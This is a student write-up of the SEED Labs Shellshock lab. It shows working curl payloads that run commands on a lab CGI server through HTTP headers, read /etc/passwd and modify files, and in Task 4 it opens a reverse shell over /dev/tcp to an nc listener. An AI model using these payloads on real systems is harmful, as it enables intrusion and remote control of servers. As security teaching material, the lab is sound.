# Shellshock Attack Lab

This week's suggested lab was Shellshock Attack Lab, from SEED labs, with the intent of providing us a better understanding of how Shellshock attacks are performed and how they can be used.

### Introduction

Before starting to thoroughly describe the lab, we were asked to type the following command:

```bash
curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

The output of this command was the "Hello World" retrieved by the `vul.cgi` file. But we got stuck trying to understand how apache maps the subdomain to the `vul.cgi` file located inside the `/usr/bin/cgi-bin` folder. We investigated a bit this and found that there is a `ScriptAlias` configuration in apache that maps the `/cgi-bin/` to the `/usr/bin/cgi-bin` folder, as shown in the next command. 

As a side note, it is important to mention that CGI (Common Gateway Interface) scripts define a way for a web server to interact with external content-generating programs. It is a simple way to put dynamic content on a website, using whatever programming language.

```bash
$ cat /etc/apache2/conf-available/serve-cgi-bin.conf
<IfModule mod_alias.c>
        <IfModule mod_cgi.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfModule mod_cgid.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfDefine ENABLE_USR_LIB_CGI_BIN>
                ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
                <Directory "/usr/lib/cgi-bin">
                        AllowOverride None
                        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                        Require all granted
                </Directory>
        </IfDefine>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

## Tasks

### Task 1

The first task asked us to verify whether the Shellshock was indeed vulnerable or not, and compare it with the `/bin/bash`. The approach we followed was first exporting an environment variable, named `foo` with a function with some random content inside, followed by a command. When called, the Shellshock bash will parse the variable, inherits the environment variables created by the parent process, and parse the created variable. It then finds the function, parses and **executes** its content, which is of course where the vulnerability occurs. As seen from the following output, the `date` command is executed as soon as the Shellshock bash is called. Then, using the `declare -f foo` command we see that indeed the `foo` function is defined and can be executed, but it is not defined as a variable, as seen from the `echo $foo` command.

- **Shellshock vulnerable bash experiment**

```bash
root@eba8d1f35da1:/# export foo='() { echo bar; } ; /bin/date'
root@eba8d1f35da1:/# /usr/bin/bash_shellshock 
Fri Mar 11 10:38:58 UTC 2022
root@eba8d1f35da1:/# env
HOSTNAME=eba8d1f35da1
TERM=xterm
LS_COLORS=...
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
SHLVL=2
HOME=/root
foo=() {  echo bar
}
_=/usr/bin/env
root@eba8d1f35da1:/# declare -f foo                                        
foo () 
{ 
    echo bar
}
root@eba8d1f35da1:/# foo                                                   
bar
root@eba8d1f35da1:/# echo $foo                                             

root@eba8d1f35da1:/#
```

The following experiment concerns the `/bin/bash`, which was patched and is not vulnerable, therefore no code execution takes place. By exporting the same `foo` variable we can observe that this vulnerability no longer exists. One thing that's also different from the Shellshock bash is that the `foo` is defined as an environment variable and not as a function.

- **Non-vulnerable bash experiment**

```bash
root@eba8d1f35da1:/# export foo='() { echo bar; } ; /bin/date'
root@eba8d1f35da1:/# bash
root@eba8d1f35da1:/# env
HOSTNAME=eba8d1f35da1
PWD=/
HOME=/root
LS_COLORS=...
foo=() { echo bar; } ; /bin/date
TERM=xterm
SHLVL=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
root@eba8d1f35da1:/# declare -f foo
root@eba8d1f35da1:/# foo
bash: foo: command not found
root@eba8d1f35da1:/# echo $foo
() { echo bar; } ; /bin/date
root@eba8d1f35da1:/# 
```

### Task 2

The next task is a simple introduction to how the latter attack will be performed. This is accomplished by passing modified environment variables to the bash-based CGI programs.

#### Task 2.A

Using the HTTP Header Live Extension, we can see the following HTTP Headers being set by the browser:

```
Host: www.seedlab-shellshock.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

And indeed when accessing http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi, using the browser, which prints the environment variables of the CGI program, we see the following output:

```
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_DNT=1
HTTP_CONNECTION=keep-alive
HTTP_UPGRADE_INSECURE_REQUESTS=1
HTTP_CACHE_CONTROL=max-age=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=36488
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```

The first set of headers sent by the browser is prepended with "HTTP_" and passed as environment variables to the CGI program.

#### Task 2.B

Using curl with the `-v (verbose)`  flag, we obtain the following request header. `Curl` sets fewer HTTP headers than the browser. Only the "Host", "User-Agent" and "Accept".

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 12 Mar 2022 18:16:31 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=51256
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
[03/12/22]seed@VM:~/.../ssi$ 
```

Using the `-A` flag we change the **User-Agent** HTTP header of the request:

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: my data
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 12 Mar 2022 18:19:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=my data
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=51266
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
[03/12/22]seed@VM:~/.../ssi$ 
```

Using the `-e` flag we change the **Referer** HTTP header of the request:

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
> Referer: my data
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 12 Mar 2022 18:21:13 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=my data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=51274
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
[03/12/22]seed@VM:~/.../ssi$ 
```

Using the `-H` flag we change set a new HTTP header named "AAAAAA" with the value "BBBBBB":

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
> AAAAAA: BBBBBB
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 12 Mar 2022 18:22:15 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
< 
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_AAAAAA=BBBBBB
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=51280
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
* Connection #0 to host www.seedlab-shellshock.com left intact
[03/12/22]seed@VM:~/.../ssi$ 
```

### Task 3

In this task, we were asked to perform different attacks to gain knowledge of our victim and play a bit with his filesystem. 

On the first attack, our goal is to get the server to return a list of files in its folder.

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "User-Agent: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls -l" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
total 8
-rwxr-xr-x 1 root root 130 Dec  5  2020 getenv.cgi
-rwxr-xr-x 1 root root  85 Dec  5  2020 vul.cgi
[03/12/22]seed@VM:~/.../ssi$ 
```

#### Task 3.A

Then, return the content of the `/etc/passwd` file, which contains, for instance, information of the users present in the system.

```
[03/12/22]seed@VM:~/.../ssi$ curl -H "User-Agent: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
[03/12/22]seed@VM:~/.../ssi$ 
```


#### Task 3.B

Then, execute the `id` command to check what is the user under our control. In this case `www-data`.

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "Attack: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[03/12/22]seed@VM:~/.../ssi$ 
```

#### Task 3.C

We then create a file named `hacked.txt` in the `/tmp` folder in the first Shellshock attack and in the second we check if the file was indeed created.

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "Attack: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/touch /tmp/hacked.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
[03/12/22]seed@VM:~/.../ssi$ curl -H "Attack: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls /tmp -l" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
total 0
-rw-r--r-- 1 www-data www-data 0 Mar 12 18:46 hacked.txt
[03/12/22]seed@VM:~/.../ssi$ 
```

#### Task 3.D

Finally, we removed the above created `hacked.txt` file and check if the removal was successful.

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/rm /tmp/hacked.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
[03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls /tmp -l" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
total 0
[03/12/22]seed@VM:~/.../ssi$ 
```

#### Questions

**Question 1: Will you be able to steal the content of the shadow file /etc/shadow from the server? Why or why not?**

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls -l /etc/shadow" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-rw-r----- 1 root shadow 501 Nov  6  2020 /etc/shadow
[03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/cat /etc/shadow 2>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
/bin/cat: /etc/shadow: Permission denied
[03/12/22]seed@VM:~/.../ssi$ 
```

No. As observed in Task 3.B, the user we control, as an attacker, is the `www-data`. By listing the permissions of the `/etc/shadow` file, we see that the "others" section in the permissions has no read access. As the file is root-owned we get a "Permission denied" error.

**Question 2: : HTTP GET requests typically attach data in the URL, after the "?" mark. This could be another approach that we can use to launch the attack. In the following example, we attach some data in the URL, and we found that the data are used to set the following environment variable:**

```bash
$ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
...
QUERY_STRING=AAAAA
...
```

**Can we use this method to launch the Shellshock attack? Please conduct your experiment and derive your conclusions based on your experiment results.**

No. The following attempts to make the attack work using a query parameter were unsuccessful because the shellshock vulnerability looks for the function definition pattern which is given by the characters "() {". But passing these characters in our payload, because a space is included, caused the attack to fail. Not even encoding the special characters made the attack successful, which makes sense for the reasons explained above.

The query parameter we wanted to send was the following: 

```bash
() { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls /tmp -l
```

The first command tries the attack using the encoded version of the parameter and the second one the plain-text version. But were not successful, as mentioned.

```bash
[03/12/22]seed@VM:~/.../ssi$ curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?%28%29%20%7B%20echo%20hello%3B%20%7D%20%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20%2Fbin%2Fls%20%2Ftmp%20-l
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=51420
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=%28%29%20%7B%20echo%20hello%3B%20%7D%20%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20%2Fbin%2Fls%20%2Ftmp%20-l
REQUEST_URI=/cgi-bin/getenv.cgi?%28%29%20%7B%20echo%20hello%3B%20%7D%20%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20%2Fbin%2Fls%20%2Ftmp%20-l
SCRIPT_NAME=/cgi-bin/getenv.cgi
[03/12/22]seed@VM:~/.../ssi$ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?() { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls /tmp -l"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
</body></html>
```

### Task 4

At the last stage of the attack, we want to get a reverse shell running in the server that will connect to the attacker's machine. This will give us a convenient way to run commands on the compromised machine.

First, we have to figure the IP of the host/attacker machine to where the victim will connect. As shown it is `10.0.2.4`.

```bash
[03/12/22]seed@VM:.../ssi$ ifconfig
...

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::2a4d:ffa2:f025:ea08  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:c8:be:ff  txqueuelen 1000  (Ethernet)
        RX packets 16361  bytes 21735211 (21.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7502  bytes 718969 (718.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

...
```

And then we prepare the payload to send. In this case, it is:


```bash
/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1
```

What this does is, opens an interactive shell connected to the server. Both Standard Output and Standard Error streams are connected to a listener in the remote machine which keeps listening for incoming connections. This makes it possible for the attacker to view the commands' output. As for the listener setup, we execute the `nc -nv -l 9090` command, which sets up a TCP socket waiting for connections on port 9090. Lastly, regarding the Standard Input stream, it is also connected to the attacker's machine making it possible to issue commands from it and view its output.

On the attacker side:

```bash
[03/12/22]seed@VM:.../ssi$ nc -nv -l 9090
Listening on 0.0.0.0 9090
Connection received on 10.9.0.80 52610
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
www-data@39f2e305d1e0:/usr/lib/cgi-bin$ ls
ls
getenv.cgi
vul.cgi
```

```bash
03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello ; } ; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

### Task 5

In this task, we were asked to use the `/bin/bash/` patched shell to issue the attack. By changing the CGI scripts not to use the shellshock vulnerable bash we expect the attack to be unsuccessful. We simply change the `vul.cgi` and `getenv.cgi` scripts' first line to `#!/bin/bash`. 

```bash
[03/12/22]seed@VM:~/.../ssi$ curl -H "User-Agent: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Hello World
[03/12/22]seed@VM:~/.../ssi$ curl -H "Attack: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Hello World
[03/12/22]seed@VM:~/.../ssi$ curl -H "Attack: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/touch /tmp/hacked.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Hello World
[03/12/22]seed@VM:~/.../ssi$ curl -H "Accept: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/rm /tmp/hacked.txt" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Hello World
[03/12/22]seed@VM:~/.../ssi$ 
```

As shown, the attacks were not successful and no commands were executed on the server-side.